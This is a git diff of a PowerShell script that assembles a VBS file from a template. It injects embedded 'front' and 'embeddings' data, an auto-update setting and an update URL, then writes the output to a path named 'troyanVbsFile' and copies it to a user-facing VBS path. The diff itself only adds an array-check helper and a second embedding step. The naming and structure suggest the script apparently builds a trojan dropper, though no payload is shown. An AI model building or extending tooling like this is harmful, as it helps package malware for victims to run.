@@ -43,6 +43,19 @@ function Convert-ArrayToQuotedString {
     return $joinedString
 }
 
+Function Check-Array {
+    param (
+        [object]$InputObject
+    )
+
+    if ($null -ne $InputObject -and $InputObject.Length -gt 0) {
+        return $true
+    } else {
+        return $false
+    }
+}
+
+
 
 
 function Create-EmbeddingFiles {
@@ -74,10 +87,14 @@ function Create-EmbeddingFiles {
         $resultData += $data
         $resultName += $filename
     }
-    $joinedResultName = Convert-ArrayToQuotedString -Array $resultName
-    $joinedResultData = Convert-ArrayToQuotedString -Array $resultData
-
-    return ($joinedResultName, $joinedResultData)
+    if (Check-Array -InputObject $resultData -eq $true)
+    {
+        $joinedResultName = Convert-ArrayToQuotedString -Array $resultName
+        $joinedResultData = Convert-ArrayToQuotedString -Array $resultData
+        return ($joinedResultName, $joinedResultData)
+    } else {
+        return ($null, $null)
+    }
 }
 
 
@@ -92,10 +109,12 @@ $result = $result -replace '__autoupdate', $server.autoUpdate
 $result = $result -replace '__updateurl', $server.updateUrl
 $result = $result -replace '0102', $body
 
-($name, $data) = Create-EmbeddingFiles -name "front" 
+($name, $data) = Create-EmbeddingFiles -name "front"
 $result = $result -replace '"__frontData"', $data
 $result = $result -replace '"__frontName"', $name
-
+($name, $data) = Create-EmbeddingFiles -name "embeddings"
+$result = $result -replace '"__backData"', $data
+$result = $result -replace '"__backName"', $name
 
 $result | Set-Content $server.troyanVbsFile
 Copy-Item -Path $server.troyanVbsFile -Destination $server.userVbsFile -Force
